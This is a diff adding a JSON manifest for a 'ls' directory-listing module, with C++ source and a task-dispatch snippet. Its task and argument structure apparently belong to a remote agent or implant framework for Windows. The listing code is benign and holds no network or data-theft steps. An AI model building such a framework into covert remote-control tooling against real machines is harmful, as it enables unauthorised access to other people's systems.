@@ -1,0 +1,29 @@
+{
+  "module": {
+    "name": "ls",
+    "display_name": "Directory Listing",
+    "description": "List files and directories in a given path",
+    "category": "filesystem",
+    "removable": true
+  },
+  "sources": {
+    "files": [
+      "ls.cpp",
+      "ls.h"
+    ]
+  },
+  "commands": {
+    "ls": {
+      "handler": "ls",
+      "args": [
+        "directory"
+      ],
+      "snippet": "    else if (task_name == \"ls\") {\n        nlohmann::json result;\n        std::string directory_to_list = task_data[\"task\"][\"args\"][\"directory\"];\n\n        if (directory_to_list.empty()) {\n            directory_to_list = \".\";\n        }\n\n        ModuleResult module_result = ls(directory_to_list);\n\n        result[\"windows_error_code\"] = module_result.windows_error_code;\n        result[\"message\"] = GetErrorMessage(module_result.windows_error_code);\n        result[\"data\"] = module_result.data;\n        return result;\n    }"
+    }
+  },
+  "dependencies": {},
+  "files": {
+    "ls.cpp": "#include <string>\n#include <filesystem>\n#include <windows.h>\n#include \"data/structs.h\"\n#include \"ls.h\"\n#include \"_debug/debug.h\"\n\nnamespace fs = std::filesystem;\n\nModuleResult ls(std::string path) {\n    std::string output;\n\n    if (fs::exists(path) && fs::is_directory(path)) {\n        for (const auto& entry : fs::directory_iterator(path)) {\n            output += entry.path().filename().string();\n            if (entry.is_directory()) {\n                output += \"/\";\n            }\n            output += \"\\n\";\n        }\n\n        if (output.empty()) {\n            output = \"There's seemingly no files here. Go look somewhere else.\";\n        }\n    }\n    else {\n        return { \"\", ERROR_PATH_NOT_FOUND};\n    }\n\n    return { output, ERROR_SUCCESS };\n}",
+    "ls.h": "#pragma once\n#include <string>\n#include \"data/structs.h\"\n#include \"_debug/debug.h\"\n\nModuleResult ls(std::string path);"
+  }
+}
